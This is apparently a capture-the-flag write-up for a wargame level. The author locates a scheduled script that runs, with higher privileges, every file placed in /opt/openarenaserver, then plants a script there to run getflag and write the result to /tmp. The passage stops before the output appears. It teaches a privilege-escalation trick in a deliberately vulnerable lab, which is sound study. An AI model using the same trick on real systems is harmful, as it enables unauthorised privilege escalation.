ls -la doesn't give any result on this level. Is there a file somewhere that I can use?

	find / -user level05

gives way too many results, most of which are permission errors.

	find / -user level05 2>&-

prevents errors from being displayed, but there's still too many results. Most results
seem to come from /proc, and a quick search tells me I won't find anything useful there.

	find / -user level05 2>&- | grep -v proc

gives me nothing. Let's see if I can find something useful if I search flag05 instead,
like the previous levels.

	find / -user flag05 2>&- | grep -v proc

gives me two files:

	/usr/sbin/openarenaserver
	/rofs/usr/sbin/openarenaserver

Here are the permissions from these files:

	-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
	-rwxr-x---  1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver

The first file has a little + behind its normal permissions. It means there are extended
permissions on that file. Using getfacl, I can see that level05 has reading permissions on
that file, and indeed, I can cat it without an issue, whereas trying to cat the second file
gives me an error.

	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
	done

The program is quite simple: it seems to execute every file in the /opt/openarenaserver directory
before deleting it.

	echo "getflag" > /opt/openarenaserver/test.sh

Now there's a file called test.sh in that directory which will simply run getflag. But I don't
have the rights to use the program, as I'm not flag05!
As I was pondering over how to make this work, I did an ls /opt/openarenaserver to find my script and
it was gone! That probably means openarenaserver automatically executes, maybe regularly.
I can't start the program myself, so I won't see its output. I need to have the program write it somewhere
else.

	echo "getflag > /tmp/answer" > /opt/openarenaserver/test.sh

After waiting for about a minute, I do a simple cat /tmp/answer:
